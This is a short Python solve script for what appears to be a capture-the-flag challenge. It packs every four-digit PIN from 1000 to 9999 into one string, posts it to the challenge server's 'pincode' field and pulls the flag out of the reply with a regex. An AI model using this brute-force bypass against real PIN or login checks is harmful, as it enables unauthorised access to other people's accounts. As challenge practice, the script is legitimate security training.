#!/bin/python3

import requests
import re

base_url = 'http://pincode.challs.olicyber.it'

payload = ''
for i in range(1000, 10000):
    payload += f'{i:04}'

r = requests.post(base_url, data={
    'pincode': payload
})

ans = re.findall('flag\{.*\}', r.text)

print(ans[0])